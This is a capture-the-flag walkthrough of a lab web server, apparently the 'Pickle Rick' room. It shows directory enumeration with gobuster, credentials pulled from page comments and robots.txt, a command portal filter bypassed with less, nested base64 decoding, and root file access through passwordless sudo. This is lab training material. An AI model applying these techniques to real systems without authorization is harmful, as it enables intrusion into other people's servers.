* On given information we can see there is a web server running on
* Lets open the ip in our browser
* There is no useful information in the home page lets analyze the source code
* Huh there is a commented code we can see
```html
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
* Lets run gobuster to check the endpoints of the webserver
```bash
gobuster dir -u http://<lab-machine-webserver-ip>/ -w ~/path/to/wordlist/
```
* Gobuster found some routes lets analyze the routes one by one
* In robots.txt we found some slug text , maybe its something useful
```robots.txt
Wubbalubbadubdub
```
* We need more info on directories and files lets check the files using extenstions
```bash
gobuster dir -u http://<lab-machine-webserver-ip>/ -x <some-extensions> -w ~/path/to/wordlist/  
```
* We could find login.php , portal.php and some files lets get into login.php using the username we found in source code and the slug text found in robots.txt (maybe password)
* Login succeed hence the slug is the password , and we can see a command execution portal after login
* Lets run `whoami` to check the current user
* it returns `www-data` ofcourse this is a webserver
* lets check the current directory using `pwd`
* ahh it shows `/var/www/html`
* lets list the files in current directory 
```bash
ls -a
```
* there is a file called `Sup3rS3cretPickl3Ingred.txt`, lets try to retrive its content using `cat`
```bash
cat Sup3rS3cretPickl3Ingred.txt
```
* oh the command is disabled lets try using `less`
```bash
less Sup3rS3cretPickl3Ingred.txt
```
* we found the first incredient in this file, lets search for the second one
* lets try to open other menu items presented
* it says `Only the REAL rick can view this page......`
* there is a file called `clue.txt` lets read the content
```bash
less clue.txt
```
* it says `Look around the file system for the other ingredient.` maybe we have to analyze more
* lets check the php files found starting with `login.php`
```bash
less login.php
```
* it renders the `login.php` content lets check the source code
* there is something commented!!
```txt
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```
* it looks like an base64 encoded string , lets try to decode
```bash
echo 'Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==' | base64 -d 2>/dev/null
```
* yeah it returned base64 encoded string again lets interate until we get original string
* on recursively decoding we found the original text as `rabbit hole` -> looks like an hint not an answer
* lets check the whole file system
```bash
ls -a /
```
* lets analyze home directory `ls /home`
* there is a user called `rick` lets analyze the user `ls /home/rick`
* we found a file called `second ingredients` 
``bash
less /home/rick/second\ ingredients
```
* hurrayyyy we found the 2nd ingredient
* lets check 3rd one in root folder, for that we have to check the user have sudo permissions or not
```bash
sudo -l
```
* it says no password lets do directly
```bash 
sudo ls /
```
* we found a file 3rd.txt lets open it
```bash
sudo less 3rd.txt
```
* we found the 3rd ingreident
> SOLVED THE ROOM
